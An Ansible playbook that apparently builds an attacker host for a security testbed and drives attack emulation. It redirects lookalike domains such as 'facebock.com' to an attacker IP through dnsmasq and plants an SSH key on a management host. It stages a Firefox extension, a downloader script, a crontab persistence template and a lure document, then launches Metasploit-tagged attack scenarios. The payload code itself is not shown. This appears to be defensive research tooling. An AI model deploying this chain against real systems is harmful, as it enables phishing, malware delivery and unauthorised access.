- name: Add attacker IP to DNS
  hosts: inetdns
  become: true
  vars:
    attacker_ip: 192.42.1.174
  handlers:
    - name: restart dnsmasq
      ansible.builtin.service:
        name: dnsmasq
        state: restarted
  tasks:
    - name: Add attacker IP to DNS
      ansible.builtin.copy:
        content: |
          address=/facebock.com/{{ attacker_ip }}
          address=/dailynews-wire.com/{{ attacker_ip }}
        owner: root
        dest: /etc/dnsmasq.d/attacker.conf
      notify: restart dnsmasq
      tags:
        - playbooks

- name: Install Attacker Host
  hosts: attacker
  become: true
  vars:
    attacker_user: aecid
    client_user: judy
    client_home: /home/{{ client_user }}
    attacker_ip: 192.42.1.174
    ansible_ssh_private_key_file: ~/.ssh/testbed
    attacker_user: aecid
  handlers:
    - name: restart dnsmasq
      ansible.builtin.service:
        name: dnsmasq
        state: restarted
      delegate_to: inetdns

    - name: restart msfrpcd
      ansible.builtin.service:
        name: msfrpcd
        state: restarted

  tasks:
    - name: get user home directory
      ansible.builtin.shell: >
             getent passwd {{ attacker_user }}  | awk -F: '{ print $6 }'
      changed_when: false
      register: user_home
      tags:
        - playbooks
        - copy

    - name: Install dependencies
      ansible.builtin.apt:
        pkg:
          - xz-utils
          - coreutils
      tags:
        - playbooks

    - name: Install Flask
      ansible.builtin.pip:
        name: flask
        state: present
      tags:
        - playbooks

    - name: Generate SSH key pair for attacker
      ansible.builtin.openssh_keypair:
        path: "{{ user_home.stdout }}/.ssh/attacker"
        type: rsa
        size: 4096
        owner: "{{ attacker_user }}"
        group: "{{ attacker_user }}"
        mode: '0600'
      tags:
        - ssh

    - name: Read SSH public key from attacker
      become: yes
      ansible.builtin.slurp:
        src: "{{ user_home.stdout }}/.ssh/attacker.pub"
      register: ssh_key
      tags:
        - ssh
    
    - name: Add public key to mgmt's authorized_keys
      become: yes
      ansible.builtin.authorized_key:
        user: aecid
        state: present
        key: "{{ ssh_key.content | b64decode }}"
      delegate_to: mgmt
      tags:
        - ssh

    - name: Copy firefox extension folder
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.copy:
          src: "firefox-extension/"
          dest: "{{ user_home.stdout }}/firefox-extension/"
          owner: "{{ attacker_user }}"
          group: "{{ attacker_user }}"
          directory_mode: '0755'
      tags:
         - playbooks

    - name: Zip extension files into .xpi
      become: true
      become_user: "{{ attacker_user }}"
      ansible.builtin.archive:
        path: "{{ user_home.stdout }}/firefox-extension/*"
        dest: "{{ user_home.stdout }}/firefox-extension/extension.xpi"
        format: zip
      tags:
        - playbooks

    - name: Copy multiple files as templates
      become: true
      become_user: "{{ attacker_user }}"
      ansible.builtin.template:
        src: "{{ item.src }}"
        dest: "{{ user_home.stdout }}/{{ item.dest }}"
        mode: '0755'
      with_items:
        - { src: "crontab.j2", dest: "crontab.txt" }
        - { src: "downloader.j2", dest: "downloader.sh" }
        - { src: "firefox-startup.c", dest: "firefox-startup.c" }
        - { src: "http_server.py", dest: "http_server.py" }
      tags:
        - playbooks

    - name: Copy ODT file directly
      become: true
      become_user: "{{ attacker_user }}"
      ansible.builtin.copy:
        src: "Nutzungshinweise.odt" 
        dest: "{{ user_home.stdout }}/Nutzungshinweise.odt"
        mode: '0644'
      tags:
        - playbooks

    - name: Compile C file
      become: true
      become_user: "{{ attacker_user }}"
      ansible.builtin.command:
        cmd: "gcc -o firefox-startup firefox-startup.c"
        chdir: "{{ user_home.stdout }}"
      tags:
        - playbooks

    - name: Run server.py with Python
      ansible.builtin.shell: >
        nohup python3 {{ user_home.stdout }}/http_server.py &
      args:
        executable: /bin/bash
      tags:
        - playbooks

  

    - name: Copy playbooks
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.template:
          src: "{{ item }}.j2"
          dest: "{{user_home.stdout}}/{{ item }}.yml"
          mode: '0755'
      loop:
          - scenario_6_a_a
          - scenario_6_a_b
          - scenario_6_b_a
          - scenario_6_b_b
          - scenario_6_c
          - upgrade
      tags:
         - playbooks
         - copy

    - name: "Run Scenario 6 a a"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_6_a_a.yml"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_6_a_a
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 6 a b"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_6_a_b.yml"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_6_a_b
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 6 b a"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_6_b_a.yml"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_6_b_a
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 6 b b"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_6_b_b.yml"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_6_b_b
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 6 c"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_6_c.yml"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_6_c
         - metasploit
         - attackmate
         - exploit



